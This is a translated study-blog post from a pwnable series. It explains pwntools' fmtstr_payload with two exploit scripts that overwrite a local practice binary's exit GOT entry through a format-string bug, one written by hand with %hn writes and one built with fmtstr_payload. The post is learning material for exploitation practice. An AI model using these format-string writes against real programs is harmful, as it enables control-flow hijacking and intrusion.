---
title: "[PWNABLE] fmtstr_payload"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ fmtstr_payload is a function that automates exploiting fsb vulnerabilities. payload = fmtstr_payload(offset, {address: value to cover})payload = fmtstr_payload(7, {addr:value})as above"
date: "2024-06-24"
translation_key: "tistory-3ade6e6201e3"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-fmtstrpayload"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

fmtstr\_payload is a function that automates exploiting fsb vulnerabilities.

```
payload = fmtstr_payload(offset, {주소 : 덮을 값})

payload = fmtstr_payload(7, {addr:value})
```

You can use it as above.

If you want to use it in a 64-bit environment, you must attach the code below.

```
context.bits = 64
```

Let's compare with the payload of the example used earlier.

```
from pwn import*

target = b'./ex'
p = process(target)
e = ELF(target)

gift = e.sym['gift']
exit_got = e.got['exit']

payload = '%{}c'.format((gift >> 16) & 0xffff )
payload += '%9$hn'
payload += '%{}c'.format(gift & 0xffff)
payload += '%10$hn'
payload += b'\x41'*3
payload += p64(exit_got+2)
payload += p64(exit_got)

p.send(payload)

p.interactive()
```

In this way, it is possible to conveniently use what was written by dividing it into pieces as shown below.

```
from pwn import*

target = b'./ex'
p = process(target)
e = ELF(target)

context.bits = 64

gift = e.sym['gift']
exit_got = e.got['exit']

payload = fmtstr_payload(6,{exit_got:gift})
p.send(payload)

p.interactive()
```

![](/assets/images/tistory/tistory-3ade6e6201e3/001.png)